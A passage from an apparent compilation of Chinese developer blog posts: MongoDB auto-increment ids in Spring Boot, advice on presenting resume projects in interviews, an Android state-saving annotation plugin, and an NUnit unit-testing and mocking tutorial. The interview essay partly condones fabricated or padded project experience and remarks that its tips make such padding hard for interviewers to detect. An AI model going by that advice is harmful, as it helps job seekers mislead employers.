import org.springframework.data.mongodb.core.mapping.Document;

@Document(collection = "IndexBuilder")
public class IndexBuilder {
    @Id
    private String id;
    private Long seq;
    //..省略get、set方法
}
其中collection = "IndexBuilder"是指数据库的集合名称，对应关系型数据库的表名。
3.2.2 创建Dao类
import com.hello.springboot.entity.IndexBuilder;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.data.mongodb.core.MongoOperations;
import org.springframework.data.mongodb.core.query.Update;
import org.springframework.stereotype.Component;
import static org.springframework.data.mongodb.core.FindAndModifyOptions.options;
import static org.springframework.data.mongodb.core.query.Criteria.where;
import static org.springframework.data.mongodb.core.query.Query.query;

@Component
public class IndexBuilderDao {
    @Autowired
    private MongoOperations mongo;
    /**
     * 查询下一个id
     * @param collectionName 集合名
     * @return
     */
    public Long getNextSequence(String collectionName) {
        IndexBuilder counter = mongo.findAndModify(
                query(where("_id").is(collectionName)),
                new Update().inc("seq", 1),
                options().returnNew(true).upsert(true),
                IndexBuilder.class);
        return counter.getSeq();
    }
}
3.2.3 使用“自增”的id
User user = new User();
user.setId(indexBuilderDao.getNextSequence("user"));
//...其他设置
核心代码：indexBuilderDao.getNextSequence("user") 使用“自增”的id，实现id自增。
到此为止，已经完成了MongoDB的自增功能，如果使用正常，数据库应该是这样的：

数据库的IndexBuilder就是用来记录每个集合的“自增id”的。
MongoDB集成的源码：https://github.com/vipstone/springboot-example/tree/master/springboot-mybatis-mongodb

********************************************************************************************************************************************************************************************************
再论面试前准备简历上的项目描述和面试时介绍项目的要点
    前几天我写了篇文章，在做技术面试官时，我是这样甄别大忽悠的——如果面试时你有这样的表现，估计悬，得到了大家的广泛关注，一度上了最多评论榜。不过，也收到了4个反对，也有有朋友说：”简直不给人活路！”，我可以想象是哪些朋友给的反对。
   由于项目介绍是面试中的重头戏，一些技术问题会围绕你介绍的项目展开，你也可以在介绍项目时亮出你的优势。所以，在准备面试的时候，你可以刷题，但首先得准备好你的项目介绍，因为这关系到你面试的成败，文本就将围绕这点展开。
    如果在简历中的项目经验是真实的，那么本文给出的技巧一定能提升面试官对你的评价，毕竟你不仅要能力强，更要让面试官感觉出这点。如果你的项目经历是虚构的，那么我也不能阻止你阅读本文。如果你用虚构的项目经验外加你的（忽悠）本事外加本文给出的技巧进了某个公司，我想这个公司的面试官也怨不到我头上，毕竟面试技术是中立的，就看被谁用。
     开场白结束，正文开始。
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------
1 面试前，回顾下你最近的项目经验，在对比下职位介绍，在简历中多列些契合点
    比如某个职位介绍里，要求候选人有Spring Boot相关经验，数据库要会Oracle，而且需要有分布式组件，比如nginx，dubbo等的相关经验，那么你就得回顾下你上个或之前的项目，是否用到过同样的或类似的技术，如果有，那么就得加到简历上，这些技术无需在简历上展开，但得结合项目具体需求写。
    一般的写法，在项目里，我用到了dubbo，redis等的技术。 
    比较好的写法，在项目里的订单管理模块里，我们是用dubbo的方式调用了客户管理系统里的方法，调用的时候我们还考虑到了超时等的异常情况。在页面展示部分，我们用redis缓存了商品信息，redis是用主从热备。
    对比上述两种写法，很明显，第二种写法明显更有说服力，因为其中列出了只有用过才知道的点，这样就能向面试官证明你确实用过相关技术。
    类似的，在职位介绍里提到的技术，最好都用同样的方法写到简历中。不过这里请注意，过犹不及，比如职位介绍里提到了5个技术，你用到了其中的3个，那么你本来也可以通过面试。但如果你自己在项目里拼接了一个实际没用到的技术，那么你就得自己承担后果了。 
2 能帮到你的其实是和职位相关的商业项目经验（含简历疑点和如何避免）
    在本文开头提到的这篇文章里，我已经分享过甄别商业项目的方法。这里我通过些假装商业项目的案例来作为反面教材，以此来说明商业项目经验该怎么描述。
    1 小A，3本学校毕业，计算机系，2年相关经验，之前的公司是一个名不见经传的公司，也就叫xx科技公司，但描述的项目却很高大上，是xx ERP项目。疑点分析：如果某大型公司，或国企，要做ERP或之类的大型项目，或者自己开发，或者让别的大公司开发（因为能出得起这个钱），如果是小公司要用，估计也就拿别人的现成的代码来改，一般不会出这个钱，所以遇到人经历少，公司规模小但项目很有名头的简历，我不能说是一律排除，但我会问很细。
    2 小B，2本计算机系，3年经验，但最近有3个月工作断档的记录。之前的公司是个软件公司，但并非是一个互联网公司，但简历上写的技术非常新潮，比如分布式缓存，dubbo之类的，而且用到了集群。还是这句话，技术是为成本服务，你上个项目规模不大，也不可能有高并发的流量，那么为什么要用这些技术？
    遇到这类简历，我就找些用过就一定能知道的问题来问，比如Redis的基本数据结构，redis如何部署，如何看redis日志，在上述案例中，我就通过这个方法发现该项目其实是个学习项目，而且这个项目是在培训学校里学的。
    3 小C，最近简历上写的是个xx系统（大家可以理解成金融物流保险等），但时间跨度比较可疑，一般来说，做个系统至少10个人左右，而且得大半年，但他简历上写的参与时间是3个月，这和培训学校里的学习时间非常相近。而且，在简历中写的是自己开发了xx系统里的xx模块，用到了redis，logstash等技术。这类简历的疑点是，第一，用了3个月完成了一个项目，而且该项目里有高新技术，且做好了以后马上离职了，这个和实际情况不符，很像培训项目。
    其实简历的疑点不止上述三个，大家也可以换位思考下，如果你是面试官，看到这份简历，会相信吗？很多疑点其实很明显。
    下面我说下真实项目里会出现的情况，写这些内容的目的不是让有些同学把学习项目和培训项目往商业项目上靠，而是让大家的简历更具备说服力。
    1 工作年限比较少的同学，未必会开发完成一个模块或参与一个项目的开发，更多场景下是参与一个维护项目，比如公司一个项目已经上线了，这个项目是历史项目，所以用的技术未必最新，但在维护项目里，其实也会开发一些功能点，该用的技术一个不会少，针对每个模块维护的时间周期也不会太长，比如每个月，针对某个模块上线3个功能点，这样也是合情合理的。
    2 还是这句话，如果有用到比较新的技术，结合业务场景写，比如用到了redis，你是缓存了哪类业务数据，这类业务数据的特点如果真的是符合缓存条件的，那么就加深了你熟悉这个技术的可信度。
    3 你站在项目经理的角度想一下，某个功能如果工期很紧，而且数据量和并发量真的不大，那么为什么要用分布式组件？换句话说，如果你在简历里写的项目背景里，有高并发请求，那么引入分布式组件的可信度就高了。而且，项目经理会让一个工作经验不足的人独立使用技术含量高的组件吗？如果候选人工作经验不多，那么比较可信的描述是，由架构师搭建好组件框架，本人用到其中一些API，但用的时候，对该组件的流程和技术坑非常了解，那么以此证明自己对该组件比较熟悉，这样可信度就非常高了。
     换句话说，你写好简历里的项目描述后，自己先读一遍，如果有夸张的成分，更得多推敲，除了个别虚假简历之外，很多情况下，其实简历是真实的，但没写好，有很多漏洞，被面试官一质疑就慌了，导致面试官认为简历不真实。     
3 沉浸入项目角色，多列些项目管理工具和技术使用细节（就是坑）
    其实证明相关项目经验是商业项目，这仅仅是第一步，更多的时候，你得通过简历中的项目描述，证明你的技能和职位描述相匹配，再进一步，你也可以证明你确实用过一些比较值钱的技术。
    对于项目开发而言，只要项目是真实的，你就一定会经历过一些场景，对于技术而言，只要你用到了，那么一定能说出些“海底针”。所以在写简历时，建议大家列些如下的关键点，以证实真实性。
    1 项目的背景，多少人做？做了多久？用什么工具打包部署发布（比如ant加jenkins）？用到哪些测试工具？用什么来进行版本管理（比如Maven+JIra）？如何打印日志（比如logger）？部署环境时，用到哪个web服务器和数据库（比如spring boot+oracle）。
     这些话在简历中一笔带过也用不了多少文字，但这样不仅能提升项目的真实性，更能展示你的实际技能。
    2 项目的开发模式和开发周期，比如用敏捷开发，那么每一个月作为一个周期，每次发布个若干功能，在每个周期发布前几天，会冻结开发，在开发过程中，会有每天的站会，代码开发完成后，会有code review。
    3  在写技术（尤其是值钱技术）描述时，最好写些细节，比如用到了dubbo，那么可以写需要设置dubbo超时时间和重试次数是1，否则可能会出现调用，如果用到了线程池，那么如何避免线程池中的OOM问题，或者用到了nginx，你就把配置文件里的关键要素写些出来。
    也就是说，你写技术时，不仅得结合项目需求写（即xx技术实现了xx功能），最好再些一些（不用太多）这个技术的用法细节（也未必太深）。面试官其实就看你用到的技术是否和职位匹配，如果职位介绍里的技术点你有都招这点要求写了，至少在筛选简历的时候，你过关的可能性就很大了。
    4 最好写些你解决的实际问题，大而言之，实际问题可以包括配置集群时的要点（比如一定要设置某个配置），小而言之，你可以写如何实现一个功能（比如出统计报表时，你用到了数据库里的行转列的功能）。哪怕是学习项目和培训项目，你运行通现有代码的时候，也会遇到各类的坑，这就更不用说商业项目了。在简历里项目描述部分，你就写上一两个，这样证明真实性的力度绝对会非常高。
    5 加上单元测试和分析问题和排查问题的描述。
      比如，在这个系统里，我是用SoapUI作为自测的工具（或者用JUnit），在测试环境上，如果出现问题，我会到linux里，用less等命令查看日志，再用JMeter等工具查看JVM的调用情况，以此来排查问题。
    这种话在简历中写下大概的描述，给出关键字（比如Jmeter,SOAPUI或职位介绍里出现的关键字）即可，不用展开，但在面试前要准备说辞。
    我知道有些候选人会对项目描述做些改动，比如在最近的项目描述里，加上些之前项目里用到的技术，或者加上职位描述里提到的技术。在这种做法是否恰当，大家自己评估，但如果你在这类技术描述里，加上本部分提到的一些要点，面试官就很难甄别了。
4 事先得排练介绍项目的说辞，讲解时，一定得围绕职位需求要点
    这里说句题外话，我面试过的候选人，从他们的表现来看，很多人是不准备项目描述的，是想到哪说到哪，这样的话，如果你准备了，和你的竞争者相比，你就大占优势了。
    在本文的第3部分里，我给出了5个方面，在简历里，你未必要写全，但在准备面试说辞时，你一定得都准备。
    1 你在项目描述里列到的所有技术点，尤其是热门的以及在职位介绍里提到的技术点，你一定得准备说辞。也是按“技术如何服务需求”以及“技术实现细节”来说，更进一步，你最好全面了解下这个技术的用法。比如nginx如何实现反向代理，该如何设置配置以及lua脚本，如果分布式系统里某个结点失效了，我想在反向代理时去掉，那该怎么在nginx配置里设。针对这个技术的常用问题点，你最好都准备下。
    2 介绍项目时，可以介绍用到哪些技术，但别展开，等面试官来问，所谓放长线钓大鱼。这个效果要比你直接说出来要好很多。
    3 有些基础的技能需求，在职位描述里未必会列，但你一定得掌握。比如通过设计模式优化代码架构，熟悉多线程并发，熟悉数据库调优等。关于这些，你可以准备些说辞，比如在这个项目里，遇到sql过长的情况，我会通过执行计划来调优，如果通过日志发现JVM性能不高，我也能排查问题，然后坐等面试官来问。
   4 开阔你的视野，别让面试官感觉你只会用非常初步的功能点。比如你项目里用到了dubbo，但在项目里，你就用到了简单的调用，那么你就不妨搜下该技术的深入技术以及别人遇到的坑，在面试过程中，你也可以找机会说出来。
5 在项目介绍时多准备些“包袱”
    刚才也提到了，在介绍项目里，你可以抛些亮点，但未必要展开，因为介绍项目时，你是介绍整体的项目以及用到的技术，如果你过于偏重介绍一个技术，那么面试官不仅会认为你表达沟通方面有问题，而且还会认为这个技术你事先准备过。
    如下列些大家可以抛出的亮点：
    1 底层代码方面，大家可以说，了解Spring IOC或Nginx（或其它任何一个职位介绍里提到的技术）的底层实现代码。面试时，大家可以先通过UML图的形式画出该技术的重要模块和过程流程，再通过讲述其中一个模块的代码来说明你确实熟悉这个技术的底层实现。
    2 数据库调优方面。比如oracle，你可以用某个长SQL为例，讲下你通过执行计划看到有哪些改进点，然后如何改进，这样的例子不用多，2,3个即可，面试时估计面试官听到其中一个以后就会认为你非常熟悉数据调优了。
   3 JVM调优和如何通过设计模式改善代码结构，在Java核心技术及面试指南里我已经提到了，这里就不展开了。
   4 架构层面的调优方法，比如通过分库分表，通过数据库集群，或者通过缓存。
   其实关于亮点的内容，我在Java Web轻量级开发面试教程里，也有详细描述。这里想说的是，大家可以准备的亮点绝不止上述4个，大家可以从调优（比如通过分布式优化并发情况场景）和技术架构（比如SSM， 分布式消息队列）上准备。再啰嗦一句，职位介绍里提到的技能点，比如Redis，大家还可以用熟悉底层实现代码来作为“亮点”，比如介绍项目时，轻描淡写地说句，我熟悉Redis底层代码（当然也可以写到简历上），然后等面试官来问时，动笔说下。 
6 别让面试官感觉你只会使用技术
    按照上述的建议，只要你能力可以（哪怕可上可下），你通过技术面试的可能性就大大增加了。但面试时，如果你表现出如下的软实力，比如在简历上项目描述部分写上，或介绍项目时说出，那么面试官甚至会感觉你很优秀。
    1 该项目的工期比较紧，我会合理安排时间，必要时，我会在项目经理安排下周末加班。（体现你的责任心）
    2 这个项目里，用到了分布式组件技术，刚开始我对此不熟悉，但我会主动查资料，遇到问题，我会及时问架构师，解决问题后，我会主动在组内分享。（有责任心，学习能力强，有团队合作意识，有分享精神）
    3 遇到技术上或需求上的疑点或是我个人无法完成问题点，我会主动上报，不会坐等问题扩大。
    4 在开发项目的过程中，通过学习，我慢慢掌握了Git+Ant+Jeninks的打包发布部署流程，现在，我会负责项目里的打包工作。或者说，在组内，我会每天观察长SQL脚本和长Dubbo调用的情况，如果遇到问题，我会每天上报，然后大家一起解决问题。（不仅能完成本职工作，而且还能积极分担项目组里的其它工作）
    5 如果出现问题，我主动会到linux里通过xxx命令查看日志，然后排查问题。（不仅积极主动，而且掌握了排查问题的方法）
    6 我会和测试人员一起，用xxx工具进行自动化测试，出现问题然后一起解决。（工作积极，而且掌握了测试等的技巧）
    7 在项目里，我会用Sonar等工具扫描代码，出现质量问题，我会和大家一起协商改掉。（具有代码质量管理的意识，而且具有提升代码质量的能力）
 
7 版权说明，总结，求推荐
    本文欢迎转载，转载前请和本人说下，请全文转载并用链接的方式指明原出处。
    本文给出的准备项目描述和说辞的经验，是根据本人以及其它多位资深技术面试官的经验总结而来。如果大家感觉本文多少有帮助，请点击下方的推荐按钮，您的推荐是我写博客的最大动力。如果大家在这方面有问题，可以通过评论问或私下给我发消息，一般我都会回。
********************************************************************************************************************************************************************************************************
不需要再手写 onSaveInstanceState 了，因为你的时间非常值钱
如果你是一个有经验的 Android 程序员，那么你肯定手写过许多 onSaveInstanceState 以及 onRestoreInstanceState 方法用来保持 Activity 的状态，因为 Activity 在变为不可见以后，系统随时可能把它回收用来释放内存。重写 Activity 中的 onSaveInstanceState 方法 是 Google 推荐的用来保持 Activity 状态的做法。

Google 推荐的最佳实践
onSaveInstanceState 方法会提供给我们一个 Bundle 对象用来保存我们想保存的值，但是 Bundle 存储是基于 key - value 这样一个形式，所以我们需要定义一些额外的 String 类型的 key 常量，最后我们的项目中会充斥着这样代码：
static final String STATE_SCORE = "playerScore";
static final String STATE_LEVEL = "playerLevel";
// ...


@Override
public void onSaveInstanceState(Bundle savedInstanceState) {
    // Save the user's current game state
    savedInstanceState.putInt(STATE_SCORE, mCurrentScore);
    savedInstanceState.putInt(STATE_LEVEL, mCurrentLevel);

    // Always call the superclass so it can save the view hierarchy state
    super.onSaveInstanceState(savedInstanceState);
}
保存完状态之后，为了能在系统重新实例化这个 Activity 的时候恢复先前被系统杀死前的状态，我们在 onCreate 方法里把原来保存的值重新取出来：
@Override
protected void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState); // Always call the superclass first

    // Check whether we're recreating a previously destroyed instance
    if (savedInstanceState != null) {
        // Restore value of members from saved state
        mCurrentScore = savedInstanceState.getInt(STATE_SCORE);
        mCurrentLevel = savedInstanceState.getInt(STATE_LEVEL);
    } else {
        // Probably initialize members with default values for a new instance
    }
    // ...
}
当然，恢复这个操作也可以在 onRestoreInstanceState 这个方法实现：
public void onRestoreInstanceState(Bundle savedInstanceState) {
    // Always call the superclass so it can restore the view hierarchy
    super.onRestoreInstanceState(savedInstanceState);

    // Restore state members from saved instance
    mCurrentScore = savedInstanceState.getInt(STATE_SCORE);
    mCurrentLevel = savedInstanceState.getInt(STATE_LEVEL);
}
解放你的双手
上面的方案当然是正确的。但是并不优雅，为了保持变量的值，引入了两个方法 ( onSaveInstanceState 和 onRestoreInstanceState ) 和两个常量 ( 为了存储两个变量而定义的两个常量，仅仅为了放到 Bundle 里面)。
为了更好地解决这个问题，我写了 SaveState 这个插件：

在使用了 SaveState 这个插件以后，保持 Activity 的状态的写法如下：
public class MyActivity extends Activity {

    @AutoRestore
    int myInt;

    @AutoRestore
    IBinder myRpcCall;

    @AutoRestore
    String result;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        // Your code here
    }
}
没错，你只需要在需要保持的变量上标记 @AutoRestore 注解即可，无需去管那几个烦人的 Activity 回调，也不需要定义多余的 String 类型 key 常量。
那么，除了 Activity 以外，Fragment 能自动保持状态吗？答案是： Yes！
public class MyFragment extends Fragment {

    @AutoRestore
    User currentLoginUser;

    @AutoRestore
    List<Map<String, Object>> networkResponse;

    @Nullable
    @Override
    public View onCreateView(@NonNull LayoutInflater inflater, @Nullable ViewGroup container, @Nullable Bundle savedInstanceState) {
        // Your code here
    }
}
使用方法和 Activity 一模一样！不止如此，使用场景还可以推广到 View， 从此，你的自定义 View，也可以把状态保持这个任务交给 SaveState ：
public class MyView extends View {

    @AutoRestore
    String someText;

    @AutoRestore
    Size size;

    @AutoRestore
    float[] myFloatArray;

    public MainView(Context context) {
        super(context);
    }

    public MainView(Context context, @Nullable AttributeSet attrs) {
        super(context, attrs);
    }

    public MainView(Context context, @Nullable AttributeSet attrs, int defStyleAttr) {
        super(context, attrs, defStyleAttr);
    }

}
现在就使用 SaveState
引入 SaveState 的方法也十分简单：
首先，在项目根目录的 build.gradle 文件中增加以下内容：
buildscript {

    repositories {
        google()
        jcenter()
    }
    dependencies {
        // your other dependencies

        // dependency for save-state
        classpath "io.github.prototypez:save-state:${latest_version}"
    }
}
然后，在 application 和 library 模块的 build.gradle 文件中应用插件：
apply plugin: 'com.android.application'
// apply plugin: 'com.android.library'
apply plugin: 'save.state'
万事具备！再也不需要写烦人的回调，因为你的时间非常值钱！做了一点微小的工作，如果我帮你节省下来了喝一杯咖啡的时间，希望你可以帮我点一个 Star，谢谢 :)
SaveState Github 地址：https://github.com/PrototypeZ/SaveState

********************************************************************************************************************************************************************************************************
持续集成之单元测试篇——WWH(讲讲我们做单元测试的故事)
持续集成之单元测试篇——WWH(讲讲我们做单元测试的故事)
前言

临近上线的几天内非重大bug不敢进行发版修复，担心引起其它问题(摁下葫芦浮起瓢)
尽管我们如此小心，仍不能避免修改一些bug而引起更多的bug的现象
往往有些bug已经测试通过了但是又复现了
我们明明没有改动过的功能，却出了问题
有些很明显的bug往往在测试后期甚至到了线上才发现，而此时修复的代价极其之大。
测试时间与周期太长并且质量得不到保障
项目与服务越来越多，测试人员严重不足（后来甚至一个研发两个测试人员比）
上线的时候仅仅一轮回归测试就需要几个小时甚至更久
无休止的加班上线。。。

如果你对以上问题非常熟悉，那么我想你的团队和我们遇到了相同的问题。
WWH:Why,What,How为什么要做单元测试，什么事单元测试，如何做单元测试。
一、为什么我们要做单元测试
1.1 问题滋生解决方案——自动化测试
    一门技术或一个解决方案的诞生的诞生，不可能凭空去创造，往往是问题而催生出来的。在我的.NET持续集成与自动化部署之路第一篇(半天搭建你的Jenkins持续集成与自动化部署系统)这篇文章中提到，我在做研发负责人的时候饱受深夜加班上线之苦，其中提到的两个大问题一个是部署问题，另一个就是测试问题。部署问题，我们引入了自动化的部署(后来我们做到了几分钟就可以上线)。我们要做持续集成，剩下的就是测试问题了。

    回归测试成了我们的第一大问题。随着我们项目的规模与复杂度的提升，我们的回归测试变得越来越困难。由于我们的当时的测试全依赖手工测试，我们项目的迭代周期大概在一个月左右，而测试的时间就要花费一半多的时间。甚至版本上线以后做一遍回归测试就需要几个小时的时间。而且这种手工进行的功能性测试很容易有遗漏的地方，因此线上Bug层出不穷。一堆问题困扰着我们，我们不得不考虑进行自动化的测试。
    自动化测试同样不是银弹，自动化测试虽然与手工测试相比有其优点，其测试效率高，资源利用率高(一般白天开发写用例，晚上自动化程序跑)，可以进行压力、负载、并发、重复等人力不可完成的测试任务，执行效率较快，执行可靠性较高，测试脚本可重复利用，bug及时发现.......但也有其不可避免的缺点，如:只适合回归测试，开发中的功能或者变更频繁的功能，由于变更频繁而不断更改测试脚本是不划算的，并且脚本的开发也需要高水平的测试人员和时间......总体来说，虽然自动化的测试可以解决一部分的问题，但也同样会带来另一些问题。到底应该不应该引入自动化的测试还需要结合自己公司的团队现状来综合考虑。
    而我们的团队从短期来看引入自动化的测试其必然会带来一些问题，但长远来看其优点还是要大于其缺陷的，因此我们决定做自动化的测试，当然这具体是不是另一个火坑还需要时间来判定！
1.2 认识自动化测试金字塔

    以上便是经典的自动化测试金字塔。
    位于金字塔顶端的是探索性测试，探索性测试并没有具体的测试方法，通常是团队成员基于对系统的理解，以及基于现有测试无法覆盖的部分，做出系统性的验证，譬如：跨浏览器的测试,一些视觉效果的测试等。探索性测试由于这类功能变更比较频繁，而且全部实现自动化成本较高，因此小范围的自动化的测试还是有效的。而且其强调测试人员的主观能动性，也不太容易通过自动化的测试来实现，更多的是手工来完成。因此其成本最高，难度最大，反馈周期也是最慢的。
    而在测试金字塔的底部是单元测试,单元测试是针对程序单元的检测，通常单元测试都能通过自动化的方式运行,单元测试的实现成本较低，运行效率较高，能够通过工具或脚本完全自动化的运行，此外，单元测试的反馈周期也是最快的，当单元测试失败后,能够很快发现，并且能够较容易的找到出错的地方并修正。重要的事单元测试一般由开发人员编写完成。(这一点很重要，因为在我这个二线小城市里，能够编写代码的测试人员实在是罕见！)
    在金字塔的中间部分，自底向上还包括接口(契约)测试，集成测试，组件测试以及端到端测试等，这些测试侧重点不同，所使用的技术方法工具等也不相同。
    总体而言，在测试金字塔中，从底部到顶部业务价值的比重逐渐增加，即越顶部的测试其业务价值越大，但其成本也越来越大，而越底部的测试其业务价值虽小，但其成本较低，反馈周期较短，效率也更高。
1.3 从单元测试开始
    我们要开始做自动化测试，但不可能一下子全都做(考虑我们的人力与技能也做不到)。因此必须有侧重点，考虑良久最终我们决定从单元测试开始。于是我在刚吃了自动化部署的螃蟹之后，不得不来吃自动化测试的第一个螃蟹。既然决定要做，那么我们就要先明白单元测试是什么？
二、单元测试是什么
2.1 什么是单元测试。
    我们先来看几个常见的对单元测试的定义。
    用最简单的话说：单元测试就是针对一个工作单元设计的测试，这里的“工作单元”是指对一个工作方法的要求。
    单元测试是开发者编写的一小段代码，用于检测被测代码的一个很小的、很明确的功能是否正确。通常而言，一个单元测试用于判断某个特定条件(或场景)下某个特定函数的行为。
例：
    你可能把一个很大的值放入一个有序list中去，然后确认该值出现在list的尾部。或者，你可能会从字符串中删除匹配某种模式的字符，然后确认字符串确实不再包含这些字符了。
执行单元测试，就是为了证明某段代码的行为和开发者所期望的一致！
2.2 什么不是单元测试
    这里我们暂且先将其分为三种情况
2.2.1 跨边界的测试
    单元测试背后的思想是，仅测试这个方法中的内容，测试失败时不希望必须穿过基层代码、数据库表或者第三方产品的文档去寻找可能的答案！
    当测试开始渗透到其他类、服务或系统时，此时测试便跨越了边界，失败时会很难找到缺陷的代码。
    测试跨边界时还会产生另一个问题，当边界是一个共享资源时，如数据库。与团队的其他开发人员共享资源时，可能会污染他们的测试结果！
2.2.2 不具有针对性的测试
    如果发现所编写的测试对一件以上的事情进行了测试，就可能违反了“单一职责原则”。从单元测试的角度来看，这意味着这些测试是难以理解的非针对性测试。随着时间的推移，向类或方法种添加了更多的不恰当的功能后，这些测试可能会变的非常脆弱。诊断问题也将变得极具有挑战性。
    如：StringUtility中计算一个特定字符在字符串中出现的次数，它没有说明这个字符在字符串中处于什么位置也没有说明除了这个字符出现多少次之外的其他任何信息，那么这些功能就应该由StringUtility类的其它方法提供！同样，StringUtility类也不应该处理数字、日期或复杂数据类型的功能！
2.2.3 不可预测的测试
    单元测试应当是可预测的。在针对一组给定的输入参数调用一个类的方法时，其结果应当总是一致的。有时，这一原则可能看起来很难遵守。例如：正在编写一个日用品交易程序，黄金的价格可能上午九时是一个值，14时就会变成另一个值。
    好的设计原则就是将不可预测的数据的功能抽象到一个可以在单元测试中模拟(Mock)的类或方法中(关于Mock请往下看)。
三、如何去做单元测试
3.1 单元测试框架
    在单元测试框架出现之前，开发人员在创建可执行测试时饱受折磨。最初的做法是在应用程序中创建一个窗口，配有"测试控制工具(harness)"。它只是一个窗口，每个测试对应一个按钮。这些测试的结果要么是一个消息框，要么是直接在窗体本身给出某种显示结果。由于每个测试都需要一个按钮，所以这些窗口很快就会变得拥挤、不可管理。
由于人们编写的大多数单元测试都有非常简单的模式：

执行一些简单的操作以建立测试。
执行测试。
验证结果。
必要时重设环境。

于是，单元测试框架应运而生(实际上就像我们的代码优化中提取公共方法形成组件)。
    单元测试框架(如NUnit)希望能够提供这些功能。单元测试框架提供了一种统一的编程模型，可以将测试定义为一些简单的类，这些类中的方法可以调用希望测试的应用程序代码。开发人员不需要编写自己的测试控制工具；单元测试框架提供了测试运行程序(runner)，只需要单击按钮就可以执行所有测试。利用单元测试框架，可以很轻松地插入、设置和分解有关测试的功能。测试失败时，测试运行程序可以提供有关失败的信息，包含任何可供利用的异常信息和堆栈跟踪。
​ .Net平台常用的单元测试框架有：MSTesting、Nunit、Xunit等。
3.2 简单示例(基于Nunit)
    /// <summary>
    /// 计算器类
    /// </summary>
    public class Calculator
    {
        /// <summary>
        /// 加法
        /// </summary>
        /// <param name="a"></param>
        /// <param name="b"></param>
        /// <returns></returns>
        public double Add(double a, double b)
        {
            return a + b;
        }

        /// <summary>
        /// 减法
        /// </summary>
        /// <param name="a"></param>
        /// <param name="b"></param>
        /// <returns></returns>
        public double Sub(double a, double b)
        {
            return a - b;
        }

        /// <summary>
        /// 乘法
        /// </summary>
        /// <param name="a"></param>
        /// <param name="b"></param>
        /// <returns></returns>
        public double Mutiply(double a, double b)
        {
            return a * b;
        }

        /// <summary>
        /// 除法
        /// </summary>
        /// <param name="a"></param>
        /// <param name="b"></param>
        /// <returns></returns>
        public double Divide(double a, double b)
        {
            return a / b;
        }
    }
    /// <summary>
    /// 针对计算加减乘除的简单的单元测试类
    /// </summary>
    [TestFixture]
    public class CalculatorTest
    {
        /// <summary>
        /// 计算器类对象
        /// </summary>
        public Calculator Calculator { get; set; }

        /// <summary>
        /// 参数1
        /// </summary>
        public double NumA { get; set; }

        /// <summary>
        /// 参数2
        /// </summary>
        public double NumB { get; set; }

        /// <summary>
        /// 初始化
        /// </summary>
        [SetUp]
        public void SetUp()
        {
            NumA = 10;
            NumB = 20;
            Calculator = new Calculator();
        }

        /// <summary>
        /// 测试加法
        /// </summary>
        [Test]
        public void TestAdd()
        {
            double result = Calculator.Add(NumA, NumB);
            Assert.AreEqual(result, 30);
        }

        /// <summary>
        /// 测试减法
        /// </summary>
        [Test]
        public void TestSub()
        {
            double result = Calculator.Sub(NumA, NumB);
            Assert.LessOrEqual(result, 0);
        }

        /// <summary>
        /// 测试乘法
        /// </summary>
        [Test]
        public void TestMutiply()
        {
            double result = Calculator.Mutiply(NumA, NumB);
            Assert.GreaterOrEqual(result, 200);
        }
        
        /// <summary>
        /// 测试除法
        /// </summary>
        [Test]
        public void TestDivide()
        {
            double result = Calculator.Divide(NumA, NumB);
            Assert.IsTrue(0.5 == result);
        }
    }
3.3 如何做好单元测试
​ 单元测试是非常有魔力的魔法，但是如果使用不恰当亦会浪费大量的时间在维护和调试上从而影响代码和整个项目。
好的单元测试应该具有以下品质:
• 自动化
• 彻底的
• 可重复的
• 独立的
• 专业的
3.3.1 测试哪些内容
​ 一般来说有六个值得测试的具体方面，可以把这六个方面统称为Right-BICEP:

Right----结果是否正确？
B----是否所有的边界条件都是正确的？
I----能否检查一下反向关联？C----能否用其它手段检查一下反向关联？
E----是否可以强制产生错误条件？
P----是否满足性能条件？

3.3.2 CORRECT边界条件
​ 代码中的许多Bug经常出现在边界条件附近，我们对于边界条件的测试该如何考虑？

一致性----值是否满足预期的格式
有序性----一组值是否满足预期的排序要求
区间性----值是否在一个合理的最大值最小值范围内
引用、耦合性----代码是否引用了一些不受代码本身直接控制的外部因素
存在性----值是否存在（例如：非Null，非零，存在于某个集合中）
基数性----是否恰好具有足够的值
时间性----所有事情是否都按照顺序发生的？是否在正确的时间、是否及时

3.3.3 使用Mock对象
    单元测试的目标是一次只验证一个方法或一个类，但是如果这个方法依赖一些其他难以操控的东西，比如网络、数据库等。这时我们就要使用mock对象，使得在运行unit test的时候使用的那些难以操控的东西实际上是我们mock的对象，而我们mock的对象则可以按照我们的意愿返回一些值用于测试。通俗来讲，Mock对象就是真实对象在我们调试期间的测试品。
Mock对象创建的步骤:

使用一个接口来描述这个对象。
为产品代码实现这个接口。
以测试为目的，在mock对象中实现这个接口。

Mock对象示例:
   /// <summary>
    ///账户操作类
    /// </summary>
    public class AccountService
    {
        /// <summary>
        /// 接口地址
        /// </summary>
        public string Url { get; set; }

        /// <summary>
        /// Http请求帮助类
        /// </summary>
        public IHttpHelper HttpHelper { get; set; }
        /// <summary>
        /// 构造函数
        /// </summary>
        /// <param name="httpHelper"></param>
        public AccountService(IHttpHelper httpHelper)
        {
            HttpHelper = httpHelper;
        }

        #region 支付
        /// <summary>
        /// 支付
        /// </summary>
        /// <param name="json">支付报文</param>
        /// <param name="tranAmt">金额</param>
        /// <returns></returns>
        public bool Pay(string json)
        {            
            var result = HttpHelper.Post(json, Url);
            if (result == "SUCCESS")//这是我们要测试的业务逻辑
            {
                return true;
            }
            return false;
        }
        #endregion

        #region 查询余额
        /// <summary>
        /// 查询余额
        /// </summary>
        /// <param name="account"></param>
        /// <returns></returns>
        public decimal? QueryAmt(string account)
        {
            var url = string.Format("{0}?account={1}", Url, account);

            var result = HttpHelper.Get(url);

            if (!string.IsNullOrEmpty(result))//这是我们要测试的业务逻辑
            {
                return decimal.Parse(result);
            }
            return null;
        }
        #endregion

    }
    /// <summary>
    /// Http请求接口
    /// </summary>
    public interface IHttpHelper
    {
        string Post(string json, string url);

        string Get(string url);
    }
    /// <summary>
    /// HttpHelper
    /// </summary>
    public class HttpHelper:IHttpHelper
    {
        public string Post(string json, string url)
        {
            //假设这是真实的Http请求
            var result = string.Empty;
            return result;
        }

        public string Get(string url)
        {
            //假设这是真实的Http请求
            var result = string.Empty;
            return result;
        }

    }
    /// <summary>
    /// Mock的 HttpHelper
    /// </summary>
    public class MockHttpHelper:IHttpHelper
    {
        public string Post(string json, string url)
        {
